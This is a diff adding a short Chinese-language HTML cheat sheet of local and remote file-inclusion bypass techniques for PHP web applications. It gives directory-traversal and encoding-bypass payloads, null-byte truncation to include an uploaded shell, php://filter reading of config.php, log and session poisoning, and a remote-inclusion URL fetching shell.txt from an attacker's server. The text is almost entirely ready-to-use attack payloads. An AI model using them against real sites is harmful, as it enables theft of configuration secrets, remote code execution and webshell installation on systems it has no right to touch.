@@ -1,0 +1,9 @@
+<h4>绕过技巧</h4>
+<ul>
+<li><b>基础本地包含</b>：<code>?page=../../../../Windows/win.ini</code>，先用系统文件确认路径层级。</li>
+<li><b>%00 截断</b>（PHP &lt; 5.3.4）：<code>?page=../../uploads/shell.jpg%00</code>，绕过服务端强制拼接的后缀。</li>
+<li><b>路径编码绕过</b>：<code>%2e%2e%2f</code>、双写 <code>....//</code>、Windows 反斜杠 <code>..%5c</code>、二次编码 <code>%252e%252e%252f</code>。</li>
+<li><b>php://filter 读源码</b>：<code>?page=php://filter/read=convert.base64-encode/resource=config.php</code>，读取而不执行。</li>
+<li><b>日志 / Session 包含</b>：包含 access.log 或 session 文件，把 PHP 代码写进 UA、Referer 或会话参数。</li>
+<li><b>远程包含（RFI）</b>：<code>allow_url_include=On</code> 时用 <code>?page=http://你的服务器/shell.txt</code>、<code>data://</code>、<code>php://input</code>。</li>
+</ul>
